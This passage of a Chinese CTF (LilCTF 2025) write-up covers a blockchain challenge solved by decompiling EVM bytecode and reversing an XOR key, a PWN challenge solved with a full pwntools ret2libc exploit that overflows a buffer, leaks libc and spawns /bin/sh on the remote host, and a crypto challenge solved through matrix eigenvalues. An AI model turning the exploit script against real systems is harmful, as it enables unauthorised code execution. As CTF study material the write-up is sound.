000000e2: PUSH14 0x57726f6e67205472656173757265
000000f1: PUSH1 0x90
000000f3: SHL
000000f4: PUSH1 0x44
000000f6: DUP3
000000f7: ADD
000000f8: MSTORE
000000f9: PUSH1 0x64
000000fb: ADD
000000fc: PUSH1 0x40
000000fe: MLOAD
000000ff: DUP1
00000100: SWAP2
00000101: SUB
00000102: SWAP1
00000103: REVERT
00000104: JUMPDEST
00000105: POP
00000106: PUSH1 0x01
00000108: DUP1
00000109: SLOAD
0000010a: PUSH1 0xff
0000010c: NOT
0000010d: AND
0000010e: DUP2
0000010f: OR
00000110: SWAP1
00000111: SSTORE
00000112: JUMP
00000113: JUMPDEST
00000114: PUSH1 0x40
00000116: DUP1
00000117: MLOAD
00000118: DUP1
00000119: DUP3
0000011a: ADD
0000011b: SWAP1
0000011c: SWAP2
0000011d: MSTORE
0000011e: PUSH1 0x0c
00000120: DUP2
00000121: MSTORE
00000122: PUSH12 0x35b2bcaf9a9b9a1c19199ab3
0000012f: PUSH1 0xa1
00000131: SHL
00000132: PUSH1 0x20
00000134: DUP3
00000135: ADD
00000136: MSTORE
00000137: DUP2
00000138: MLOAD
00000139: PUSH1 0x60
0000013b: SWAP2
0000013c: DUP4
0000013d: SWAP2
0000013e: PUSH1 0x00
00000140: SWAP1
00000141: PUSH8 0xffffffffffffffff
0000014a: DUP2
0000014b: GT
0000014c: ISZERO
0000014d: PUSH2 0x0157
00000150: JUMPI
00000151: PUSH2 0x0157
00000154: PUSH2 0x0224
00000157: JUMP
00000158: JUMPDEST
00000159: PUSH1 0x40
0000015b: MLOAD
0000015c: SWAP1
0000015d: DUP1
0000015e: DUP3
0000015f: MSTORE
00000160: DUP1
00000161: PUSH1 0x1f
00000163: ADD
00000164: PUSH1 0x1f
00000166: NOT
00000167: AND
00000168: PUSH1 0x20
0000016a: ADD
0000016b: DUP3
0000016c: ADD
0000016d: PUSH1 0x40
0000016f: MSTORE
00000170: DUP1
00000171: ISZERO
00000172: PUSH2 0x0181
00000175: JUMPI
00000176: PUSH1 0x20
00000178: DUP3
00000179: ADD
0000017a: DUP2
0000017b: DUP1
0000017c: CALLDATASIZE
0000017d: DUP4
0000017e: CALLDATACOPY
0000017f: ADD
00000180: SWAP1
00000181: POP
00000182: JUMPDEST
00000183: POP
00000184: SWAP1
00000185: POP
00000186: PUSH1 0x00
00000188: JUMPDEST
00000189: DUP4
0000018a: MLOAD
0000018b: DUP2
0000018c: LT
0000018d: ISZERO
0000018e: PUSH2 0x021b
00000191: JUMPI
00000192: DUP3
00000193: DUP4
00000194: MLOAD
00000195: DUP3
00000196: PUSH2 0x019e
00000199: SWAP2
0000019a: SWAP1
0000019b: PUSH2 0x03c2
0000019e: JUMP
0000019f: JUMPDEST
000001a0: DUP2
000001a1: MLOAD
000001a2: DUP2
000001a3: LT
000001a4: PUSH2 0x01ae
000001a7: JUMPI
000001a8: PUSH2 0x01ae
000001ab: PUSH2 0x03e4
000001ae: JUMP
000001af: JUMPDEST
000001b0: PUSH1 0x20
000001b2: ADD
000001b3: ADD
000001b4: MLOAD
000001b5: PUSH1 0xf8
000001b7: SHR
000001b8: PUSH1 0xf8
000001ba: SHL
000001bb: PUSH1 0xf8
000001bd: SHR
000001be: DUP5
000001bf: DUP3
000001c0: DUP2
000001c1: MLOAD
000001c2: DUP2
000001c3: LT
000001c4: PUSH2 0x01ce
000001c7: JUMPI
000001c8: PUSH2 0x01ce
000001cb: PUSH2 0x03e4
000001ce: JUMP
000001cf: JUMPDEST
000001d0: PUSH1 0x20
000001d2: ADD
000001d3: ADD
000001d4: MLOAD
000001d5: PUSH1 0xf8
000001d7: SHR
000001d8: PUSH1 0xf8
000001da: SHL
000001db: PUSH1 0xf8
000001dd: SHR
000001de: XOR
000001df: PUSH1 0xf8
000001e1: SHL
000001e2: DUP3
000001e3: DUP3
000001e4: DUP2
000001e5: MLOAD
000001e6: DUP2
000001e7: LT
000001e8: PUSH2 0x01f2
000001eb: JUMPI
000001ec: PUSH2 0x01f2
000001ef: PUSH2 0x03e4
000001f2: JUMP
000001f3: JUMPDEST
000001f4: PUSH1 0x20
000001f6: ADD
000001f7: ADD
000001f8: SWAP1
000001f9: PUSH1 0x01
000001fb: PUSH1 0x01
000001fd: PUSH1 0xf8
000001ff: SHL
00000200: SUB
00000201: NOT
00000202: AND
00000203: SWAP1
00000204: DUP2
00000205: PUSH1 0x00
00000207: BYTE
00000208: SWAP1
00000209: MSTORE8
0000020a: POP
0000020b: DUP1
0000020c: PUSH2 0x0213
0000020f: DUP2
00000210: PUSH2 0x03fa
00000213: JUMP
00000214: JUMPDEST
00000215: SWAP2
00000216: POP
00000217: POP
00000218: PUSH2 0x0187
0000021b: JUMP
0000021c: JUMPDEST
0000021d: POP
0000021e: SWAP5
0000021f: SWAP4
00000220: POP
00000221: POP
00000222: POP
00000223: POP
00000224: JUMP
00000225: JUMPDEST
00000226: PUSH4 0x4e487b71
0000022b: PUSH1 0xe0
0000022d: SHL
0000022e: PUSH1 0x00
00000230: MSTORE
00000231: PUSH1 0x41
00000233: PUSH1 0x04
00000235: MSTORE
00000236: PUSH1 0x24
00000238: PUSH1 0x00
0000023a: REVERT
0000023b: JUMPDEST
0000023c: PUSH1 0x00
0000023e: PUSH1 0x20
00000240: DUP3
00000241: DUP5
00000242: SUB
00000243: SLT
00000244: ISZERO
00000245: PUSH2 0x024c
00000248: JUMPI
00000249: PUSH1 0x00
0000024b: DUP1
0000024c: REVERT
0000024d: JUMPDEST
0000024e: DUP2
0000024f: CALLDATALOAD
00000250: PUSH8 0xffffffffffffffff
00000259: DUP1
0000025a: DUP3
0000025b: GT
0000025c: ISZERO
0000025d: PUSH2 0x0264
00000260: JUMPI
00000261: PUSH1 0x00
00000263: DUP1
00000264: REVERT
00000265: JUMPDEST
00000266: DUP2
00000267: DUP5
00000268: ADD
00000269: SWAP2
0000026a: POP
0000026b: DUP5
0000026c: PUSH1 0x1f
0000026e: DUP4
0000026f: ADD
00000270: SLT
00000271: PUSH2 0x0278
00000274: JUMPI
00000275: PUSH1 0x00
00000277: DUP1
00000278: REVERT
00000279: JUMPDEST
0000027a: DUP2
0000027b: CALLDATALOAD
0000027c: DUP2
0000027d: DUP2
0000027e: GT
0000027f: ISZERO
00000280: PUSH2 0x028a
00000283: JUMPI
00000284: PUSH2 0x028a
00000287: PUSH2 0x0224
0000028a: JUMP
0000028b: JUMPDEST
0000028c: PUSH1 0x40
0000028e: MLOAD
0000028f: PUSH1 0x1f
00000291: DUP3
00000292: ADD
00000293: PUSH1 0x1f
00000295: NOT
00000296: SWAP1
00000297: DUP2
00000298: AND
00000299: PUSH1 0x3f
0000029b: ADD
0000029c: AND
0000029d: DUP2
0000029e: ADD
0000029f: SWAP1
000002a0: DUP4
000002a1: DUP3
000002a2: GT
000002a3: DUP2
000002a4: DUP4
000002a5: LT
000002a6: OR
000002a7: ISZERO
000002a8: PUSH2 0x02b2
000002ab: JUMPI
000002ac: PUSH2 0x02b2
000002af: PUSH2 0x0224
000002b2: JUMP
000002b3: JUMPDEST
000002b4: DUP2
000002b5: PUSH1 0x40
000002b7: MSTORE
000002b8: DUP3
000002b9: DUP2
000002ba: MSTORE
000002bb: DUP8
000002bc: PUSH1 0x20
000002be: DUP5
000002bf: DUP8
000002c0: ADD
000002c1: ADD
000002c2: GT
000002c3: ISZERO
000002c4: PUSH2 0x02cb
000002c7: JUMPI
000002c8: PUSH1 0x00
000002ca: DUP1
000002cb: REVERT
000002cc: JUMPDEST
000002cd: DUP3
000002ce: PUSH1 0x20
000002d0: DUP7
000002d1: ADD
000002d2: PUSH1 0x20
000002d4: DUP4
000002d5: ADD
000002d6: CALLDATACOPY
000002d7: PUSH1 0x00
000002d9: SWAP3
000002da: DUP2
000002db: ADD
000002dc: PUSH1 0x20
000002de: ADD
000002df: SWAP3
000002e0: SWAP1
000002e1: SWAP3
000002e2: MSTORE
000002e3: POP
000002e4: SWAP6
000002e5: SWAP5
000002e6: POP
000002e7: POP
000002e8: POP
000002e9: POP
000002ea: POP
000002eb: JUMP
000002ec: JUMPDEST
000002ed: PUSH1 0x00
000002ef: DUP3
000002f0: MLOAD
000002f1: PUSH1 0x00
000002f3: JUMPDEST
000002f4: DUP2
000002f5: DUP2
000002f6: LT
000002f7: ISZERO
000002f8: PUSH2 0x030c
000002fb: JUMPI
000002fc: PUSH1 0x20
000002fe: DUP2
000002ff: DUP7
00000300: ADD
00000301: DUP2
00000302: ADD
00000303: MLOAD
00000304: DUP6
00000305: DUP4
00000306: ADD
00000307: MSTORE
00000308: ADD
00000309: PUSH2 0x02f2
0000030c: JUMP
0000030d: JUMPDEST
0000030e: DUP2
0000030f: DUP2
00000310: GT
00000311: ISZERO
00000312: PUSH2 0x031b
00000315: JUMPI
00000316: PUSH1 0x00
00000318: DUP3
00000319: DUP6
0000031a: ADD
0000031b: MSTORE
0000031c: JUMPDEST
0000031d: POP
0000031e: SWAP2
0000031f: SWAP1
00000320: SWAP2
00000321: ADD
00000322: SWAP3
00000323: SWAP2
00000324: POP
00000325: POP
00000326: JUMP
00000327: JUMPDEST
00000328: PUSH1 0x00
0000032a: DUP1
0000032b: DUP4
0000032c: SLOAD
0000032d: DUP2
0000032e: PUSH1 0x01
00000330: DUP3
00000331: DUP2
00000332: SHR
00000333: SWAP2
00000334: POP
00000335: DUP1
00000336: DUP4
00000337: AND
00000338: DUP1
00000339: PUSH2 0x0342
0000033c: JUMPI
0000033d: PUSH1 0x7f
0000033f: DUP4
00000340: AND
00000341: SWAP3
00000342: POP
00000343: JUMPDEST
00000344: PUSH1 0x20
00000346: DUP1
00000347: DUP5
00000348: LT
00000349: DUP3
0000034a: EQ
0000034b: ISZERO
0000034c: PUSH2 0x0362
0000034f: JUMPI
00000350: PUSH4 0x4e487b71
00000355: PUSH1 0xe0
00000357: SHL
00000358: DUP7
00000359: MSTORE
0000035a: PUSH1 0x22
0000035c: PUSH1 0x04
0000035e: MSTORE
0000035f: PUSH1 0x24
00000361: DUP7
00000362: REVERT
00000363: JUMPDEST
00000364: DUP2
00000365: DUP1
00000366: ISZERO
00000367: PUSH2 0x0376
0000036a: JUMPI
0000036b: PUSH1 0x01
0000036d: DUP2
0000036e: EQ
0000036f: PUSH2 0x0387
00000372: JUMPI
00000373: PUSH2 0x03b4
00000376: JUMP
00000377: JUMPDEST
00000378: PUSH1 0xff
0000037a: NOT
0000037b: DUP7
0000037c: AND
0000037d: DUP10
0000037e: MSTORE
0000037f: DUP5
00000380: DUP10
00000381: ADD
00000382: SWAP7
00000383: POP
00000384: PUSH2 0x03b4
00000387: JUMP
00000388: JUMPDEST
00000389: PUSH1 0x00
0000038b: DUP11
0000038c: DUP2
0000038d: MSTORE
0000038e: PUSH1 0x20
00000390: SWAP1
00000391: KECCAK256
00000392: PUSH1 0x00
00000394: JUMPDEST
00000395: DUP7
00000396: DUP2
00000397: LT
00000398: ISZERO
00000399: PUSH2 0x03ac
0000039c: JUMPI
0000039d: DUP2
0000039e: SLOAD
0000039f: DUP12
000003a0: DUP3
000003a1: ADD
000003a2: MSTORE
000003a3: SWAP1
000003a4: DUP6
000003a5: ADD
000003a6: SWAP1
000003a7: DUP4
000003a8: ADD
000003a9: PUSH2 0x0393
000003ac: JUMP
000003ad: JUMPDEST
000003ae: POP
000003af: POP
000003b0: DUP5
000003b1: DUP10
000003b2: ADD
000003b3: SWAP7
000003b4: POP
000003b5: JUMPDEST
000003b6: POP
000003b7: SWAP5
000003b8: SWAP9
000003b9: SWAP8
000003ba: POP
000003bb: POP
000003bc: POP
000003bd: POP
000003be: POP
000003bf: POP
000003c0: POP
000003c1: POP
000003c2: JUMP
000003c3: JUMPDEST
000003c4: PUSH1 0x00
000003c6: DUP3
000003c7: PUSH2 0x03df
000003ca: JUMPI
000003cb: PUSH4 0x4e487b71
000003d0: PUSH1 0xe0
000003d2: SHL
000003d3: PUSH1 0x00
000003d5: MSTORE
000003d6: PUSH1 0x12
000003d8: PUSH1 0x04
000003da: MSTORE
000003db: PUSH1 0x24
000003dd: PUSH1 0x00
000003df: REVERT
000003e0: JUMPDEST
000003e1: POP
000003e2: MOD
000003e3: SWAP1
000003e4: JUMP
000003e5: JUMPDEST
000003e6: PUSH4 0x4e487b71
000003eb: PUSH1 0xe0
000003ed: SHL
000003ee: PUSH1 0x00
000003f0: MSTORE
000003f1: PUSH1 0x32
000003f3: PUSH1 0x04
000003f5: MSTORE
000003f6: PUSH1 0x24
000003f8: PUSH1 0x00
000003fa: REVERT
000003fb: JUMPDEST
000003fc: PUSH1 0x00
000003fe: PUSH1 0x00
00000400: NOT
00000401: DUP3
00000402: EQ
00000403: ISZERO
00000404: PUSH2 0x041c
00000407: JUMPI
00000408: PUSH4 0x4e487b71
0000040d: PUSH1 0xe0
0000040f: SHL
00000410: PUSH1 0x00
00000412: MSTORE
00000413: PUSH1 0x11
00000415: PUSH1 0x04
00000417: MSTORE
00000418: PUSH1 0x24
0000041a: PUSH1 0x00
0000041c: REVERT
0000041d: JUMPDEST
0000041e: POP
0000041f: PUSH1 0x01
00000421: ADD
00000422: SWAP1
00000423: JUMP
00000424: INVALID
00000425: LOG2
00000426: PUSH5 0x6970667358
0000042c: INVALID
0000042d: SLT
0000042e: KECCAK256
0000042f: INVALID
00000430: INVALID
00000431: PUSH22 0xe6de4319072b595bdd2382e9d4da7081fe0f1e58eb39
00000448: INVALID
00000449: DATACOPY
0000044a: INVALID
0000044b: ADD
0000044c: OR
0000044d: PUSH10 0x3e64736f6c6343000809
00000458: STOP
00000459: CALLER
```

看的不是很明白，[Online Solidity Decompiler](https://ethervm.io/decompile) 反编译一下

```solidity
contract Contract {
    function main() {
        memory[0x40:0x60] = 0x80;
        var var0 = msg.value;
    
        if (var0) { revert(memory[0x00:0x00]); }
    
        if (msg.data.length < 0x04) { revert(memory[0x00:0x00]); }
    
        var0 = msg.data[0x00:0x20] >> 0xe0;
    
        if (var0 == 0x5cc4d812) {
            // Dispatch table entry for 0x5cc4d812 (unknown)
            var var1 = 0x004e;
            var var2 = 0x0049;
            var var3 = msg.data.length;
            var var4 = 0x04;
            var2 = func_023A(var3, var4);
            func_0049(var2);
            stop();
        } else if (var0 == 0x64d98f6e) {
            // Dispatch table entry for isSolved()
            var temp0 = memory[0x40:0x60];
            memory[temp0:temp0 + 0x20] = !!(storage[0x01] & 0xff);
            var temp1 = memory[0x40:0x60];
            return memory[temp1:temp1 + (temp0 + 0x20) - temp1];
        } else { revert(memory[0x00:0x00]); }
    }
    
    function func_0049(var arg0) {
        var var0 = 0x0073;
        var var1 = arg0;
        var0 = func_0112(var1);
        var temp0 = var0;
        var0 = 0x0083;
        var1 = temp0;
        var var2 = memory[0x40:0x60] + 0x20;
        var0 = func_02EB(var1, var2);
        var temp1 = memory[0x40:0x60];
        var temp2 = var0;
        memory[temp1:temp1 + 0x20] = temp2 - temp1 - 0x20;
        memory[0x40:0x60] = temp2;
        var0 = keccak256(memory[temp1 + 0x20:temp1 + 0x20 + memory[temp1:temp1 + 0x20]]);
        var1 = 0x00ab;
        var var3 = memory[0x40:0x60] + 0x20;
        var2 = 0x00;
        var1 = func_0326(var2, var3);
        var temp3 = memory[0x40:0x60];
        var temp4 = var1;
        memory[temp3:temp3 + 0x20] = temp4 - temp3 - 0x20;
        memory[0x40:0x60] = temp4;
    
        if (keccak256(memory[temp3 + 0x20:temp3 + 0x20 + memory[temp3:temp3 + 0x20]]) == var0) {
            storage[0x01] = (storage[0x01] & ~0xff) | 0x01;
            return;
        } else {
            var temp5 = memory[0x40:0x60];
            memory[temp5:temp5 + 0x20] = 0x461bcd << 0xe5;
            memory[temp5 + 0x04:temp5 + 0x04 + 0x20] = 0x20;
            memory[temp5 + 0x24:temp5 + 0x24 + 0x20] = 0x0e;
            memory[temp5 + 0x44:temp5 + 0x44 + 0x20] = 0x57726f6e67205472656173757265 << 0x90;
            var temp6 = memory[0x40:0x60];
            revert(memory[temp6:temp6 + (temp5 + 0x64) - temp6]);
        }
    }
    
    function func_0112(var arg0) returns (var r0) {
        var temp0 = memory[0x40:0x60];
        memory[0x40:0x60] = temp0 + 0x40;
        memory[temp0:temp0 + 0x20] = 0x0c;
        memory[temp0 + 0x20:temp0 + 0x20 + 0x20] = 0x35b2bcaf9a9b9a1c19199ab3 << 0xa1;
        var var2 = temp0;
        var var0 = 0x60;
        var var1 = arg0;
        var var4 = memory[var1:var1 + 0x20];
        var var3 = 0x00;
    
        if (var4 <= 0xffffffffffffffff) {
            var temp1 = memory[0x40:0x60];
            var temp2 = var4;
            var var5 = temp2;
            var4 = temp1;
            memory[var4:var4 + 0x20] = var5;
            memory[0x40:0x60] = var4 + (var5 + 0x1f & ~0x1f) + 0x20;
        
            if (!var5) {
                var3 = var4;
                var4 = 0x00;
            
                if (var4 >= memory[var1:var1 + 0x20]) {
                label_021B:
                    return var3;
                } else {
                label_0191:
                    var5 = var2;
                    var var6 = 0x019e;
                    var var8 = var4;
                    var var7 = memory[var5:var5 + 0x20];
                    var6 = func_03C2(var7, var8);
                
                    if (var6 < memory[var5:var5 + 0x20]) {
                        var5 = ((memory[var6 + 0x20 + var5:var6 + 0x20 + var5 + 0x20] >> 0xf8) << 0xf8) >> 0xf8;
                        var6 = var1;
                        var7 = var4;
                    
                        if (var7 < memory[var6:var6 + 0x20]) {
                            var5 = ((((memory[var7 + 0x20 + var6:var7 + 0x20 + var6 + 0x20] >> 0xf8) << 0xf8) >> 0xf8) ~ var5) << 0xf8;
                            var6 = var3;
                            var7 = var4;
                        
                            if (var7 < memory[var6:var6 + 0x20]) {
                                memory[var7 + 0x20 + var6:var7 + 0x20 + var6 + 0x01] = byte(var5 & ~((0x01 << 0xf8) - 0x01), 0x00);
                                var5 = var4;
                                var6 = 0x0213;
                                var7 = var5;
                                var6 = func_03FA(var7);
                                var4 = var6;
                            
                                if (var4 >= memory[var1:var1 + 0x20]) { goto label_021B; }
                                else { goto label_0191; }
                            } else {
                                var8 = 0x01f2;
                            
                            label_03E4:
                                memory[0x00:0x20] = 0x4e487b71 << 0xe0;
                                memory[0x04:0x24] = 0x32;
                                revert(memory[0x00:0x24]);
                            }
                        } else {
                            var8 = 0x01ce;
                            goto label_03E4;
                        }
                    } else {
                        var7 = 0x01ae;
                        goto label_03E4;
                    }
                }
            } else {
                var temp3 = var5;
                memory[var4 + 0x20:var4 + 0x20 + temp3] = msg.data[msg.data.length:msg.data.length + temp3];
                var3 = var4;
                var4 = 0x00;
            
                if (var4 >= memory[var1:var1 + 0x20]) { goto label_021B; }
                else { goto label_0191; }
            }
        } else {
            var5 = 0x0157;
            memory[0x00:0x20] = 0x4e487b71 << 0xe0;
            memory[0x04:0x24] = 0x41;
            revert(memory[0x00:0x24]);
        }
    }
    
    function func_023A(var arg0, var arg1) returns (var r0) {
        var var0 = 0x00;
    
        if (arg0 - arg1 i< 0x20) { revert(memory[0x00:0x00]); }
    
        var var1 = msg.data[arg1:arg1 + 0x20];
        var var2 = 0xffffffffffffffff;
    
        if (var1 > var2) { revert(memory[0x00:0x00]); }
    
        var temp0 = arg1 + var1;
        var1 = temp0;
    
        if (var1 + 0x1f i>= arg0) { revert(memory[0x00:0x00]); }
    
        var var3 = msg.data[var1:var1 + 0x20];
    
        if (var3 <= var2) {
            var temp1 = memory[0x40:0x60];
            var temp2 = ~0x1f;
            var temp3 = temp1 + ((temp2 & var3 + 0x1f) + 0x3f & temp2);
            var var4 = temp3;
            var var5 = temp1;
        
            if (!((var4 < var5) | (var4 > var2))) {
                memory[0x40:0x60] = var4;
                var temp4 = var3;
                memory[var5:var5 + 0x20] = temp4;
            
                if (var1 + temp4 + 0x20 > arg0) { revert(memory[0x00:0x00]); }
            
                var temp5 = var3;
                var temp6 = var5;
                memory[temp6 + 0x20:temp6 + 0x20 + temp5] = msg.data[var1 + 0x20:var1 + 0x20 + temp5];
                memory[temp6 + temp5 + 0x20:temp6 + temp5 + 0x20 + 0x20] = 0x00;
                return temp6;
            } else {
                var var6 = 0x02b2;
            
            label_0224:
                memory[0x00:0x20] = 0x4e487b71 << 0xe0;
                memory[0x04:0x24] = 0x41;
                revert(memory[0x00:0x24]);
            }
        } else {
            var4 = 0x028a;
            goto label_0224;
        }
    }
    
    function func_02EB(var arg0, var arg1) returns (var r0) {
        var var0 = 0x00;
        var var1 = memory[arg0:arg0 + 0x20];
        var var2 = 0x00;
    
        if (var2 >= var1) {
        label_030C:
        
            if (var2 <= var1) { return var1 + arg1; }
        
            var temp0 = var1;
            var temp1 = arg1;
            memory[temp1 + temp0:temp1 + temp0 + 0x20] = 0x00;
            return temp0 + temp1;
        } else {
        label_02FB:
            var temp2 = var2;
            memory[temp2 + arg1:temp2 + arg1 + 0x20] = memory[arg0 + temp2 + 0x20:arg0 + temp2 + 0x20 + 0x20];
            var2 = temp2 + 0x20;
        
            if (var2 >= var1) { goto label_030C; }
            else { goto label_02FB; }
        }
    }
    
    function func_0326(var arg0, var arg1) returns (var r0) {
        var var0 = 0x00;
        var var1 = var0;
        var temp0 = storage[arg0];
        var var2 = temp0;
        var var4 = 0x01;
        var var3 = var2 >> var4;
        var var5 = var2 & var4;
    
        if (var5) {
            var var6 = 0x20;
        
            if (var5 != (var3 < var6)) {
            label_0362:
                var var7 = var5;
            
                if (!var7) {
                    var temp1 = arg1;
                    memory[temp1:temp1 + 0x20] = var2 & ~0xff;
                    var1 = temp1 + var3;
                
                label_03B4:
                    return var1;
                } else if (var7 == 0x01) {
                    memory[0x00:0x20] = arg0;
                    var var8 = keccak256(memory[0x00:0x20]);
                    var var9 = 0x00;
                
                    if (var9 >= var3) {
                    label_03AC:
                        var1 = arg1 + var3;
                        goto label_03B4;
                    } else {
                    label_039C:
                        var temp2 = var8;
                        var temp3 = var9;
                        memory[temp3 + arg1:temp3 + arg1 + 0x20] = storage[temp2];
                        var8 = var4 + temp2;
                        var9 = var6 + temp3;
                    
                        if (var9 >= var3) { goto label_03AC; }
                        else { goto label_039C; }
                    }
                } else { goto label_03B4; }
            } else {
            label_034F:
                var temp4 = var1;
                memory[temp4:temp4 + 0x20] = 0x4e487b71 << 0xe0;
                memory[0x04:0x24] = 0x22;
                revert(memory[temp4:temp4 + 0x24]);
            }
        } else {
            var temp5 = var3 & 0x7f;
            var3 = temp5;
            var6 = 0x20;
        
            if (var5 != (var3 < var6)) { goto label_0362; }
            else { goto label_034F; }
        }
    }
    
    function func_03C2(var arg0, var arg1) returns (var r0) {
        var var0 = 0x00;
    
        if (arg0) { return arg1 % arg0; }
    
        memory[0x00:0x20] = 0x4e487b71 << 0xe0;
        memory[0x04:0x24] = 0x12;
        revert(memory[0x00:0x24]);
    }
    
    function func_03FA(var arg0) returns (var r0) {
        var var0 = 0x00;
    
        if (arg0 != ~0x00) { return arg0 + 0x01; }
    
        memory[0x00:0x20] = 0x4e487b71 << 0xe0;
        memory[0x04:0x24] = 0x11;
        revert(memory[0x00:0x24]);
    }
```

![](https://assets.bili33.top/img/LilCTF2025-Writeup/abb3ae02-be8f-43f1-b324-338f3c3d04d4.png)

先 cast 一下 storage 0 的值, 返回0x5d，二进制为01011101，根据Solidity动态数组的存储规则，这是一个长数组，其长度为 `(0x5d - 1) / 2 = 46` 字节。数据实际存储的起始位置是 `keccak256(0)` = 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563

通过cast访问这个地址可以得到一个32字节的数据 0x5d504d6f07030200040606575d064c390202025d040701535c574c3902030000

由于前面知道了长度总共是46个字节, 所以需要继续读取下一个地址的数据 0x010000005e564a6c0107075e0557000000000000000000000000000000000000

拼接之后可以得到完整的密文 0x5d504d6f07030200040606575d064c390202025d040701535c574c3902030000010000005e564a6c0107075e0557

然后需要逆向一下这个验证逻辑, `func_0112` 是加密函数, 他的逻辑就是一个循环异或, key 是 `0x35b2bcaf9a9b9a1c19199ab3 << 0xa1`, 解出来转成ascii是`key_5748235f` 然后写脚本把密文和密钥循环异或就能构造出我们的输入

```python
secret = "0x5d504d6f07030200040606575d064c390202025d040701535c574c3902030000010000005e564a6c0107075e0557"
key = "key_5748235f".encode('ascii')
secret_data = bytes.fromhex(secret.replace("0x", ""))
required_input_bytes = bytearray()
for i in range(len(secret_data)):
    transformed_byte = secret_data[i] ^ key[i % len(key)]
    required_input_bytes.append(transformed_byte)
required_input_hex = required_input_bytes.hex()
print(required_input_hex)
# 36353430323436383635333136633566373536653634343537323566373434383333356635333333343033663764
```

然后需要把算出来的数据构造成call-data发到链上进行交易, 首先前4字节是函数选择器, 通过反编译可以得到需要调用的函数是0x5cc4d812, 加下来32字节是 0000000000000000000000000000000000000000000000000000000000000020, 这个 0x20 指的是数据在这个位置的 32 字节之后开始, 接下来是数据的长度, 前面知道了是 46 个字节,所以是 000...2e, 然后 46 字节就是我们要传的数据，由于ABI数据规范要求 32 字节对齐, 所以后面需要补 18 个 0

最后构造的命令如下

```bash
$ cast send 0x801C106775A116af3420358922fF10FeaA77119b "0x5cc4d8120000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002e36353430323436383635333136633566373536653634343537323566373434383333356635333333343033663764000000000000000000000000000000000000" --private-key <private_key> --rpc-url http://106.15.138.99:8545/
```

![](https://assets.bili33.top/img/LilCTF2025-Writeup/4f96133f-096f-4644-b427-61934e85b29f.png)

可以看到返回的status为success, 然后在 nc 回去就拿到flag了: `LILCTF{WH#_11ves_IN_a_se@$he1l_undEr_tH3_S3@?}`

## PWN

### PWN-Checkin

基础 ret2libc

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[112]; // [rsp+0h] [rbp-70h] BYREF

  setbuf(stdin, 0);
  setbuf(_bss_start, 0);
  setbuf(stderr, 0);
  puts("Welcome to lilctf!");
  puts("What's your name?");
  read(0, buf, 0x200u);
  return 0;
}
```

找到 libc 中 `system` 和 `/bin/sh` 的地址, 分别为`0x50d70`，`0x1d8678`, 然后通过 `puts` 泄露 `libc` 基址, 然后通过 `read` 溢出执行 `system("/bin/sh")` 就行

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

program_base = 0x400000

system_offset = 0x50d70
binsh_offset = 0x1d8678
puts_offset = 0x80e50

pop_rdi_ret = 0x401176
ret_gadget = 0x40101a

puts_plt = 0x401060
puts_got = 0x404018
main_addr = 0x401178

offset = 0x70 + 8

def exploit():
    p = remote('challenge.xinshi.fun', 44430)
    
    payload1 = b'A' * offset
    payload1 += p64(pop_rdi_ret)
    payload1 += p64(puts_got)
    payload1 += p64(puts_plt)
    payload1 += p64(main_addr)

    p.sendlineafter(b"What's your name?", payload1)
    
    p.recvuntil(b"\n")
    leaked_data = p.recv(8)
    
    leaked_puts = u64(leaked_data[:6].ljust(8, b'\x00'))
    print(f"[+] 泄露的puts地址: {hex(leaked_puts)}")
    
    libc_base = leaked_puts - puts_offset
    print(f"[+] 计算的libc基地址: {hex(libc_base)}")
    
    system_addr = libc_base + system_offset
    binsh_addr = libc_base + binsh_offset
    
    print(f"[+] system地址: {hex(system_addr)}")
    print(f"[+] /bin/sh地址: {hex(binsh_addr)}")
    
    payload2 = b'A' * offset
    payload2 += p64(ret_gadget)
    payload2 += p64(pop_rdi_ret)
    payload2 += p64(binsh_addr)
    payload2 += p64(system_addr)
    
    p.sendlineafter(b"What's your name?", payload2)
    p.interactive()

if __name__ == "__main__":
    exploit()

```

## Crypto

### ez_math

令`A = [[v1_x, v1_y], [v2_x, v2_y]]` `B = [[v1_x * lambda1, v1_y * lambda1], [v2_x * lambda2, v2_y * lambda2]]`

则有 `C = A⁻¹ * B`

定义对角矩阵 `D = [[lambda1, 0], [0, lambda2]]`

则有`D * A = [[lambda1, 0], [0, lambda2]] * [[v1_x, v1_y], [v2_x, v2_y]]` `= [[lambda1*v1_x, lambda1*v1_y], [lambda2*v2_x, lambda2*v2_y]]` -> `B = D * A`

推出 `C = A⁻¹ * D * A`

由相似矩阵的性质得，C 和 D 的特征值 lambda 相同

=====> 计算 C 的特征值 =====> 转换回去 bytes =====> 进行两种可能的拼接 =====> 得到 flag

```python
from sage.all import *
from Crypto.Util.number import long_to_bytes

# 已知数据
p = 9620154777088870694266521670168986508003314866222315790126552504304846236696183733266828489404860276326158191906907396234236947215466295418632056113826161
C_list = [[7062910478232783138765983170626687981202937184255408287607971780139482616525215270216675887321965798418829038273232695370210503086491228434856538620699645, 7096268905956462643320137667780334763649635657732499491108171622164208662688609295607684620630301031789132814209784948222802930089030287484015336757787801], [7341430053606172329602911405905754386729224669425325419124733847060694853483825396200841609125574923525535532184467150746385826443392039086079562905059808, 2557244298856087555500538499542298526800377681966907502518580724165363620170968463050152602083665991230143669519866828587671059318627542153367879596260872]]

# 在有限域 GF(p) 上定义矩阵 C
Fp = GF(p)
C_matrix = matrix(Fp, C_list)

# 计算特征值
eigenvalues = C_matrix.eigenvalues()

# 将特征值从有限域元素转换为整数
lambda1_int = int(eigenvalues[0])
lambda2_int = int(eigenvalues[1])

# 将整数转换回字节
part1 = long_to_bytes(lambda1_int)
part2 = long_to_bytes(lambda2_int)

# 尝试两种拼接顺序
flag_content1 = part1 + part2
flag_content2 = part2 + part1

print(f"特征值1: {lambda1_int} -> 字节: {part1}")
print(f"特征值2: {lambda2_int} -> 字节: {part2}")
print(f"可能的flag内容 (1): {flag_content1.decode()}")
print(f"可能的flag内容 (2): {flag_content2.decode()}")
```

```bash
(.venv) [root@LUMINE-LAPTOP ez_math]# sage solve.py
特征值1: 461081882199191304136043558055592717274072444511548267131743 -> 字节: b'It_w4s_the_be5t_of_times_'
特征值2: 310431440615324582056084165589022472378402725080813836002613 -> 字节: b'1t_wa5_the_w0rst_of_t1me5'
